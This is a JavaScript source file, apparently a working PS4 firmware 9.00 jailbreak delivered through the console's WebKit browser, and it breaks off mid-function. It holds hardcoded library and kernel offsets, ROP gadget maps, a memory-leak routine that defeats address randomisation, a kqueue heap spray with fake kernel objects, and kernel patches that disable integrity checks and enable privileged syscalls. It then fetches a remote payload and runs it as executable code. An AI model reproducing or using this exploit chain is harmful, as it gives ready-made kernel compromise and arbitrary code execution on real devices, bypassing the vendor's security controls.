const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;
const OFFSET_WKR_psl_builtin = 0x33BA0;
const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;
const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;
const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;

let usbWaitTime = 3000; //set a default time
var payloadData = "";
let rebootHandled = false;
var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;
var webKitBase;
var webKitRequirementBase;
var libSceLibcInternalBase;
var libKernelBase;
var textArea = document.createElement("textarea");
var handle;
var random_path;
var ex_info;
var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {
    "ret": 0x32,
    "pop rdi": 0x319690,
    "pop rsi": 0x1F4D6,
    "pop rdx": 0x986C,
    "pop rcx": 0x657B7,
    "pop r8": 0xAFAA71,
    "pop r9": 0x422571,
    "pop rax": 0x51A12,
    "pop rsp": 0x4E293,

    "mov [rdi], rsi": 0x1A97920,
    "mov [rdi], rax": 0x10788F7,
    "mov [rdi], eax": 0x9964BC,

    "cli ; pop rax": 0x566F8,
    "sti": 0x1FBBCC,

    "mov rax, [rax]": 0x241CC,
    "mov rax, [rsi]": 0x5106A0,
    "mov [rax], rsi": 0x1EFD890,
    "mov [rax], rdx": 0x1426A82,
    "mov [rax], edx": 0x3B7FE4,
    "add rax, rsi": 0x170397E,
    "mov rdx, rax": 0x53F501,
    "add rax, rcx": 0x2FBCD,
    "mov rsp, rdi": 0x2048062,
    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
    "infloop": 0x7DFF,

    "mov [rax], cl": 0xC6EAF,
};
var wkr_gadgetmap = {
    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
};
var wk2_gadgetmap = {
    "mov [rax], rdi": 0xFFDD7,
    "mov [rax], rcx": 0x2C9ECA,
    "mov [rax], cx": 0x15A7D52,
};
var hmd_gadgetmap = {
    "add [r8], r12": 0x2BCE1
};
var ipmi_gadgetmap = {
    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
};
function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.add32 = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32 = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function (val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function (vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function (val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    }

    return this;
}
function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}

//use this for testing catch errors
async function killScripts(xxx) {
    alert(xxx);
    await forceGC(); //frazzle some memory

    // 1. Clear all existing timers
    let highestId = setTimeout(() => { }, 0);
    for (let i = 0; i <= highestId; i++) {
        clearTimeout(i);
        clearInterval(i);
    }

    try {
        const kill = () => { };
        window.setTimeout = kill;
        window.setInterval = kill;
        window.requestAnimationFrame = kill;
        window.addEventListener = kill;
        document.addEventListener = kill;
        await cleanup();
        throw new Error("Reboot your PS4, or Try again!"); //kill stuff here
    }
    catch {
        alert("bollocks - failed to kill shit");
    }
}

async function loadConfig() {
    const response = await fetch('/get-config');
    const config = await response.json();
    usbWaitTime = Number(config.timeout);
    if (usbWaitTime === null || usbWaitTime <= 2699 || usbWaitTime >= 10000) {
        usbWaitTime = 3000;
    }
}

async function checkUSBMounted() {
    await fetch("./usbon", { method: "POST" });
    const startTime = Date.now();
    while (Date.now() - startTime < usbWaitTime) {
        const status = await fetch("./usbon");
        if (status.ok) {
            const elapsed = Date.now() - startTime;
            return { success: true, elapsedTime: elapsed }; // ✅ success + time
        }
        await sleep(100);
    }
    return { success: false, elapsedTime: usbWaitTime }; // ⛔ timeout case
}

async function restartUSB() {
    //unmount usb image - doesn't unmount the usb drive, only the data gets reset.
    var getpl = new XMLHttpRequest();
    getpl.open("POST", "./usboff", true);
    getpl.send(null);
}

async function handleReboot() {
		await createPopUpMessage("<span style='color: red;'>♥</span><span style='color: white;'> All done, your PS4 is hacked </span><span style='color: red;'>♥</span><br><br><br><br>Press the PS button to exit");
    await cleanup();
    if (rebootHandled) return; // Exit if it's already been run
    await showMessage("*** Rebooting USB Dongle ***");
    rebootHandled = true; // Mark as run

    try {
        const response = await fetch("/reboot");
        if (response.ok) {
            await showMessage("*** USB Unmounted ***");
        }
    } catch (error) {
        await showMessage("*** Error Rebooting ***");
    }
}

async function ManualReboot() {
    if (confirm("Unmount USB")) {
        try {
            const response = await fetch("/reboot");
            if (response.ok) {
                await showMessage("*** Rebooting Dongle ***");
            }
        }
        catch (error) {
            await showMessage("*** Error Rebooting Dongle ***");
        }
    }
}

async function sleep(ms) {
    try {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    catch {
        await showMessage("*** Error Sleeping ***");
    }
}

async function cleanup() {
    try {
        await showMessage("*** Cleaning up some browser memory ***");
        await sleep(500);        // this delay seems to crash things....?
        kchain = null;
        kchain2 = null;
        handle = null;
        ex_info = null;
        random_path = null;
        window.nogc = [];
        view_leak_arr = null;
        jsview = null;
        pressure = null;
        rstr = null;
        view_leak = null;
        s1 = null;
        nogc = []; // Clear garbage-collection-resistant references
        if (foo && foo.parentNode) foo.remove();
    }
    catch {
        return; // 🚪 Exit the async function immediately
    }
}

/*
This creates artificial memory pressure to free up memory
Allocates smaller objects (arrays with 10,000 numbers)
Runs the loop 10 times, enough to create memory churn without eating hundreds of MB.
Sets the object to null right after creation to release the reference.
*/

async function fetchPayloadWithRetry(url, retries = 3, timeoutMs = 1000) {
    for (let i = 0; i < retries; i++) {
        try {
            await showMessage(`*** Trying to fetch ${payloadTitle} ***<br>Press the PS button and retry exploit if you get stuck here!`);

            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

            const response = await fetch(url, { signal: controller.signal });
            clearTimeout(timeoutId);

            if (!response.ok) {
                throw new Error(`Server response ${response.status} for ${payloadTitle}`);
            }

            return await response.arrayBuffer(); // success

        } catch {
            if (i === retries - 1) {
                await showMessage(`Payload fetch failed ${retries} times, press the PS button to exit and try again`);
            } else {
                await showMessage(`Attempt ${i + 1} failed: ${err.name === 'AbortError' ? 'Timeout' : err.message}. Retrying...`);
                await sleep(1000);
            }
        }
    }
}

async function loadPayload() {
		if (payloadTitle === 'Binloader') {
			BinLoader(); //Payloads are sent using netcatGUI from a PC
    	return;
    }
    rebootHandled = false;
    const MAX_RETRIES = 3;
    let attempt = 0;

    while (attempt < MAX_RETRIES) {
        attempt++;

        try {
            // Fetch payload twice independently
            const [PLD1, PLD2] = await Promise.all([
                fetchPayloadWithRetry(payloadFile),
                fetchPayloadWithRetry(payloadFile)
            ]);

            if (PLD1.byteLength === 0 || PLD2.byteLength === 0) {
                await showMessage("Error Fetching " + payloadTitle);
                return;
            }

            // Allocate memory buffers
            const payload_buffer1 = chain.syscall(477, 0, PLD1.byteLength * 4, 7, 0x1002, -1, 0);
            const payload_buffer2 = chain.syscall(477, 0, PLD2.byteLength * 4, 7, 0x1002, -1, 0);

            const pl1 = p.array_from_address(payload_buffer1, PLD1.byteLength * 4);
            const pl2 = p.array_from_address(payload_buffer2, PLD2.byteLength * 4);

            const preparePayload = (pld) => {
                const padding = new Uint8Array(4 - (pld.byteLength % 4) % 4);
                const tmp = new Uint8Array(pld.byteLength + padding.byteLength);
                tmp.set(new Uint8Array(pld), 0);
                tmp.set(padding, pld.byteLength);
                return new Uint32Array(tmp.buffer);
            };

            const shellcode1 = preparePayload(PLD1);
            const shellcode2 = preparePayload(PLD2);

            pl1.set(shellcode1, 0);
            pl2.set(shellcode2, 0);

            // Verify payload sizes
            if (shellcode1.length !== shellcode2.length) {
                await showMessage(`Payload size mismatch between fetches (Attempt ${attempt}/${MAX_RETRIES})`);
                chain.syscall(477, payload_buffer1, 0, 0, 0, 0, 0, 0);
                chain.syscall(477, payload_buffer2, 0, 0, 0, 0, 0, 0);
                await sleep(1000);
                continue; // retry
            }

            // Verify memory contents
            let corrupted = false;
            for (let i = 0; i < shellcode1.length; i++) {
                if (pl1[i] !== pl2[i]) {
                    await showMessage(`Mismatch at offset ${i}: PLD1=0x${pl1[i].toString(16)}, PLD2=0x${pl2[i].toString(16)}`);
                    corrupted = true;
                    break;
                }
            }

            if (corrupted) {
                await showMessage(`Payload verification failed (Attempt ${attempt}/${MAX_RETRIES})`);
                chain.syscall(477, payload_buffer1, 0, 0, 0, 0, 0, 0);
                chain.syscall(477, payload_buffer2, 0, 0, 0, 0, 0, 0);
                await sleep(1000);
                continue; // retry
            }

            // Clean up second buffer
            chain.syscall(477, payload_buffer2, 0, 0, 0, 0, 0, 0);

            // Execute Payload
            const pthread = p.malloc(0x10);
            const result = chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer1, 0);
            const loadedSuccessfully = (result !== 0);

            if (loadedSuccessfully) {
                chain.syscall(477, payload_buffer1, 0, 0, 0, 0, 0, 0);
                await showMessage("*** " + payloadTitle + " Loaded ***");
                setTimeout(() => handleReboot(), 1500);
                return;
            } else {
                await showMessage("*** --- " + payloadTitle + " Not Loaded --- ***");
                return;
            }

        } catch {
            await showMessage(`Payload injection failed (Attempt ${attempt}/${MAX_RETRIES})`);
            await sleep(1000);
            continue; // retry
        }
    }
}

async function userland() {
    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;
    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    var textAreaVtable = p.read8(textAreaVtPtr);
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
    webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
    webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);

    for (var gadget in wk_gadgetmap) {
        window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (var gadget in wkr_gadgetmap) {
        window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
    }

    function get_jmptgt(address) {
        var instr = p.read4(address) & 0xFFFF;
        var offset = p.read4(address.add32(2));
        if (instr != 0x25FF) {
            return 0;
        }
        return address.add32(0x6 + offset);
    }

    function malloc(sz) {
        var backing = new Uint8Array(0x10000 + sz);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc32(sz) {
        var backing = new Uint8Array(0x10000 + sz * 4);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing.buffer);
        return ptr;
    }

    function array_from_address(addr, size) {
        var og_array = new Uint32Array(0x1000);
        var og_array_i = p.leakval(og_array).add32(0x10);
        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);
        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        var bufView = new Uint8Array(str.length + 1);
        for (var i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    }

    function readstr(addr) {
        var str = "";
        for (var i = 0; ; i++) {
            var c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    var fakeVtable_setjmp = p.malloc32(0x200);
    var fakeVtable_longjmp = p.malloc32(0x200);
    var original_context = p.malloc32(0x40);
    var modified_context = p.malloc32(0x40);
    p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
    p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two));
    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
    p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one));
    p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
    p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two));
    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one));
    function launch_chain(chain) {
        chain.push(window.gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
        p.write8(textAreaVtPtr, fakeVtable_setjmp);
        textArea.scrollLeft = 0x0;
        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
        p.write8(modified_context.add32(0x10), chain.stack);
        p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))
        p.write8(textAreaVtPtr, fakeVtable_longjmp);
        textArea.scrollLeft = 0x0;
        p.write8(textAreaVtPtr, textAreaVtable);
    }
    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);
    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);
    var countbytes;
    for (var i = 0; i < 0x40000; i++) {
        if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i = 0; i < countbytes; i++) {
        if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
            dview8[0] = kview[i + 3];
            dview8[1] = kview[i + 4];
            dview8[2] = kview[i + 5];
            dview8[3] = kview[i + 6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    p.write8(kstr, orig_kview_buf);
    chain = new rop();
    if (chain.syscall(20).low == 0) {
        alert("Exploit failed. Try again if your ps4 is on fw 9.00.");
        while (1);
    }
}

async function run_hax() {
    try {
        await userland();
        if (chain.syscall(23, 0).low != 0x0) {
            await kernel();
            patch_once(); //uncomment this if you get issues running payloads....
            await forceGC();  // try to free up some memory now
            await loadPayload();
        }
        else {
            await showMessage("Exploit active - injecting " + payloadTitle);
            await loadPayload();
        }
    }
    catch {
        await showMessage("Error running exploit!");
    }
}

async function kernel() {
    try {
        await extra_gadgets();
        await kchain_setup();
        await object_setup();
        await trigger_spray();
    }
    catch {
        //await showMessage("Error running exploit!");
        killScripts("Kernel expoit failed");
    }
}

async function load_prx(name) {
    var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
    if (res.low != 0x0) {
        alert("failed to load prx/get handle " + name);
    }
    p.write8(ex_info, 0x1A8);
    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
    if (res.low != 0x0) {
        alert("failed to get module info from handle");
    }
    var tlsinit = p.read8(ex_info.add32(0x110));
    var tlssize = p.read4(ex_info.add32(0x11C));
    if (tlssize != 0) {
        if (name == "libSceWebKit2.sprx") {
            tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
        } else {
            alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
        }
    }
    return tlsinit;
}

async function extra_gadgets() {
    handle = p.malloc(0x1E8);
    var randomized_path_length_ptr = handle.add32(0x4);
    var randomized_path_ptr = handle.add32(0x14);
    ex_info = randomized_path_ptr.add32(0x40);
    p.write8(randomized_path_length_ptr, 0x2C);
    chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
    random_path = p.readstr(randomized_path_ptr);
    var ipmi_addr = await load_prx("libSceIpmi.sprx");
    var hmd_addr = await load_prx("libSceHmd.sprx");
    var wk2_addr = await load_prx("libSceWebKit2.sprx");
    for (var gadget in hmd_gadgetmap) {
        window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
    }
    for (var gadget in wk2_gadgetmap) {
        window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
    }
    for (var gadget in ipmi_gadgetmap) {
        window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
    }
    for (var gadget in window.gadgets) {
        p.read8(window.gadgets[gadget]);
        chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
    }
    chain.run();
}

async function kchain_setup() {
    const KERNEL_busy = 0x1B28DF8;
    const KERNEL_bcopy = 0xACD;
    const KERNEL_bzero = 0x2713FD;
    const KERNEL_pagezero = 0x271441;
    const KERNEL_memcpy = 0x2714BD;
    const KERNEL_pagecopy = 0x271501;
    const KERNEL_copyin = 0x2716AD;
    const KERNEL_copyinstr = 0x271B5D;
    const KERNEL_copystr = 0x271C2D;
    const KERNEL_setidt = 0x312c40;
    const KERNEL_setcr0 = 0x1FB949;
    const KERNEL_Xill = 0x17d500;
    const KERNEL_veriPatch = 0x626874;
    const KERNEL_veriPatchSleep = 0x62715f;
    const KERNEL_enable_syscalls_1 = 0x490;
    const KERNEL_enable_syscalls_2 = 0x4B5;
    const KERNEL_enable_syscalls_3 = 0x4B9;
    const KERNEL_enable_syscalls_4 = 0x4C2;
    const KERNEL_mprotect = 0x80B8D;
    const KERNEL_prx = 0x23AEC4;
    const KERNEL_dlsym_1 = 0x23B67F;
    const KERNEL_dlsym_2 = 0x221b40;
    const KERNEL_setuid = 0x1A06;
    const KERNEL_syscall11_1 = 0x1100520;
    const KERNEL_syscall11_2 = 0x1100528;
    const KERNEL_syscall11_3 = 0x110054C;
    const KERNEL_syscall11_gadget = 0x4c7ad;
    const KERNEL_mmap_1 = 0x16632A;
    const KERNEL_mmap_2 = 0x16632D;
    const KERNEL_setcr0_patch = 0x3ade3B;
    const KERNEL_kqueue_close_epi = 0x398991;
    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
    p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));
    kchain = new rop();
    kchain2 = new rop();
    {
        chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
        chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
        chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
    }
    chain.run();
    kchain.count = 0;
    kchain2.count = 0;
    kchain.set_kernel_var(KERNEL_BASE_PTR);
    kchain2.set_kernel_var(KERNEL_BASE_PTR);
    kchain.push(gadgets["pop rax"]);
    kchain.push(SAVED_KERNEL_STACK_PTR);
    kchain.push(gadgets["mov [rax], rdi"]);
    kchain.push(gadgets["pop r8"]);
    kchain.push(KERNEL_BASE_PTR);
    kchain.push(gadgets["add [r8], r12"]);
    kchain.kwrite1(KERNEL_busy, 0x1);
    kchain.push(gadgets["sti"]);
    var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
    var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(0x6);
    kchain.push(gadgets["pop rsi"]);
    kchain.push(gadgets["mov rsp, rdi"]);
    kchain.push(gadgets["pop rdx"]);
    kchain.push(0xE);
    kchain.push(gadgets["pop rcx"]);
    kchain.push(0x0);
    kchain.push(gadgets["pop r8"]);
    kchain.push(0x0);
    var idx1_dest = kchain.get_rsp();
    kchain.pushSymbolic();
    kchain.push(gadgets["pop rsi"]);
    kchain.push(0x80040033);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(kchain2.stack);
    var idx2_dest = kchain.get_rsp();
    kchain.pushSymbolic();
    kchain.finalizeSymbolic(idx1, idx1_dest);
    kchain.finalizeSymbolic(idx2, idx2_dest);
    kchain2.kwrite2(KERNEL_veriPatch, 0x00EB);
    kchain2.kwrite2(KERNEL_veriPatchSleep, 0x00eb);
    kchain2.kwrite1(KERNEL_bcopy, 0xEB);
    kchain2.kwrite1(KERNEL_bzero, 0xEB);
    kchain2.kwrite1(KERNEL_pagezero, 0xEB);
    kchain2.kwrite1(KERNEL_memcpy, 0xEB);
    kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
    kchain2.kwrite1(KERNEL_copyin, 0xEB);
    kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
    kchain2.kwrite1(KERNEL_copystr, 0xEB);
    kchain2.kwrite1(KERNEL_busy, 0x0);
    var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
    var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x6);
    kchain2.push(gadgets["pop rsi"]);
    var idx3_dest = kchain2.get_rsp();
    kchain2.pushSymbolic();
    kchain2.push(gadgets["pop rdx"]);
    kchain2.push(0xE);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x0);
    kchain2.push(gadgets["pop r8"]);
    kchain2.push(0x0);
    var idx4_dest = kchain2.get_rsp();
    kchain2.pushSymbolic();
    kchain2.finalizeSymbolic(idx3, idx3_dest);
    kchain2.finalizeSymbolic(idx4, idx4_dest);
    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
    kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
    kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
    kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
    kchain2.kwrite1(KERNEL_setuid, 0xEB);
    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
    kchain2.kwrite2(KERNEL_prx, 0xE990);
    kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
    kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);
    kchain2.kwrite1(KERNEL_mmap_1, 0x37);
    kchain2.kwrite1(KERNEL_mmap_2, 0x37);
    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
    kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
    var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x80050033);
    var idx5_dest = kchain2.get_rsp();
    kchain2.pushSymbolic();
    kchain2.finalizeSymbolic(idx5, idx5_dest);
    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
    kchain2.push(gadgets["mov rdx, rax"]);
    kchain2.push(gadgets["pop rsi"]);
    kchain2.push(SAVED_KERNEL_STACK_PTR);
    kchain2.push(gadgets["mov rax, [rsi]"]);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x10);
    kchain2.push(gadgets["add rax, rcx"]);
    kchain2.push(gadgets["mov [rax], rdx"]);
    kchain2.push(gadgets["pop rdi"]);
    var idx6 = kchain2.pushSymbolic();
    kchain2.push(gadgets["mov [rdi], rax"]);
    kchain2.push(gadgets["sti"]);
    kchain2.push(gadgets["pop rsp"]);
    var idx6_dest = kchain2.get_rsp();
    kchain2.pushSymbolic();
    kchain2.finalizeSymbolic(idx6, idx6_dest);
}

async function object_setup() {
    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
    var fake_filtops = fake_knote.add32(0x4000);
    var fake_obj = fake_knote.add32(0x8000);
    if (fake_knote.low != 0x4000) {
        alert("enomem: " + fake_knote);
        while (1);
    }
    {
        p.write8(fake_knote, fake_obj);
        p.write8(fake_knote.add32(0x68), fake_filtops)
    }
    {
        p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]);
        p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]);
        p.write8(fake_filtops.add32(0x8), kchain.stack);
        p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]);
    }
    {
        p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]);
    }
    chain.syscall(203, fake_knote, 0xC000);
}

var trigger_spray = async function () {
    const NUM_KQUEUES = 0x1B0;
    const kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
    {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[362]);
            chain.write_result4(kqueue_ptr.add32(0x4 * i));
        }
    }
    chain.run();
    var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);

    var that_one_socket = chain.syscall(97, 2, 1, 0);
    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
        alert("invalid socket");
        while (1);
    }
    var kevent = p.malloc(0x20);
    p.write8(kevent.add32(0x0), that_one_socket);
    p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
    p.write4(kevent.add32(0xC), 0x0);
    p.write8(kevent.add32(0x10), 0x0);
    p.write8(kevent.add32(0x18), 0x0);
    {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
        }
    }
    chain.run();
    {
        for (var i = 18; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
    }
    chain.run();

    await loadConfig();
    var sleeptime = + ((usbWaitTime / 1000).toFixed(2));
    const result = await checkUSBMounted(); // ✅ Wait here
    if (result.success) {
        const timeSec = (result.elapsedTime / 1000).toFixed(2);
        await showMessage(`USB mounted successfully after ${timeSec} seconds` + "<br>Sleeping for " + sleeptime.toString() + " Seconds");
        //even though the usb is mounted, PS4 takes some time to recognise it, so give it some time
        await sleep(usbWaitTime);  // ✅ Now safe to wait and continue
    }
    else {
        await showMessage("USB did not mount within " + sleeptime.toString() + " Seconds");
        await restartUSB(); //restarts the dongle
        return;  // ⛔ Exit early if USB isn’t mounted
    }
    try {
        //Fragment memory
        for (var i = 1; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }

        chain.run();

        if (chain.syscall(23, 0).low == 0) {
            chain.fcall(window.syscalls[73], 0x4000, 0xC000);
            chain.fcall(window.syscalls[325]);
            chain.run();
            //await forceGC();  // try to free up some memory now
            //await loadPayload();
            return;

        }
        usbWaitTime += 500;
        const newtime = (usbWaitTime / 1000).toFixed(2);
        await showMessage(`Failed to exploit<br>try increasing USB Timeout Delay to ${newtime} seconds.`);
        p.write8(0, 0);
        await ManualReboot(); //maybe mod later to unmount and remount usb
    }
    catch {
        await showMessage("Error: the exploit failed to trigger the Spray function<br>Reboot your console and try again");
        await forceGC();
        await ManualReboot();
    }
};

//This disables sysveri, see patch.s for more info
var patch_once = function () {

    var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
    var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);

    patch_buffer_view[0] = 0x00000BB8;
